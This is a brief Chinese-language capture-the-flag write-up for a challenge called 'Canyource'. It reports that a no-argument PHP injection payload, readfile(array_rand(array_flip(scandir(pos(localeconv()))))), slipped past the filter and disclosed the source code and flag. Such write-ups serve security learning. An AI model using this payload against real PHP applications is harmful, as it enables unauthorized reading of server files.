---
title: Canyource
date: 2026-02-05 12:00:00
tags:
  - 题解
  - RCE
---

无参构造题发现readfile(array_rand(array_flip(scandir(pos(localeconv())))));似乎没有被限制，尝试输入查看源码得到flag


![Canyource_a9e2f5bd](/images/writeups/Canyource_a9e2f5bd.png)
